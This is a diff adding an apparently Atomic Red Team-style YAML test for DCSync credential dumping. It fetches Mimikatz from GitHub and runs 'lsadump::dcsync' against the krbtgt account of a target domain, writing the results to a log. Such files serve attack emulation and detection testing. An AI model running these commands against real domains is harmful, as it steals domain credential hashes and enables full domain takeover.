@@ -1,0 +1,47 @@
+attack_technique: T2000
+display_name: "OS Credential Dumping: DCSync"
+atomic_tests:
+- name: DCSync
+  description: |
+    Attack allowing retrieval of account information without accessing memory or retrieving the NTDS database
+    [Reference] (https://adsecurity.org/?p=1729)
+  supported_platforms:
+    - windows
+  input_arguments:
+    domain:
+      description: Targeted domain
+      type: string
+      default: example.com
+    user:
+      description: Targeted user
+      type: string
+      default: krbtgt
+    output_file:
+      description: Output file
+      type: path
+      default: PathToAtomicsFolder\T1003.005\bin\Mimikatz\x64\mimikatz.log
+    mimikatz_path:
+      description: mimikatz windows executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.005\Mimikatz\x64\mimikatz.exe
+
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+      New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+      Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+
+  executor:
+    name: command_prompt
+    elevation_required: false # indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false
+    command: | # these are the actaul attack commands, at least one command must be provided
+      #{mimikatz_path} "log #{output_file}" "lsadump::dcsync /domain:#{domain} /user:#{user}" "exit" > $null
+    cleanup_command: | # you can remove the cleanup_command section if there are no cleanup commands
+      'rm #{output_file}'
